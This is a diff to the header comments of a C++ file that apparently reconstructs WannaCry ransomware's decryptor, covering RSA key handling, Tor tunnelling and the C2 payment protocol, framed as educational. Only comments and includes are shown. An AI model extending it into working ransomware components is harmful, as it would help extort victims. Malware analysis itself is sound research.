@@ -1,6 +1,8 @@
-// WanaDecryptor ("@WanaDecryptor@.exe") core-logic reconstruction — research/educational.
-// Covers RSA-2048 key management (.pky/.dky/.eky/.res, TESTDATA self-test), the WANACRY!
-// container decrypt engine, Tor bootstrap + SOCKS5 tunnel, and the C2 payment protocol.
+// decryptor.cpp — the WannaCry payment/decrypt UI (u.wnry / @WanaDecryptor@.exe)
+// RSA-2048 key management (.pky/.dky/.eky/.res, TESTDATA self-test), the
+// WANACRY! container decrypt engine, Tor bootstrap + SOCKS5 tunnel, and the
+// C2 payment protocol.
+// Reconstructed from the 2017 WannaCry binary (educational).
 
 #include <winsock2.h>          // socket types (the original reached these through MFC42's CAsyncSocket)
 #include <windows.h>
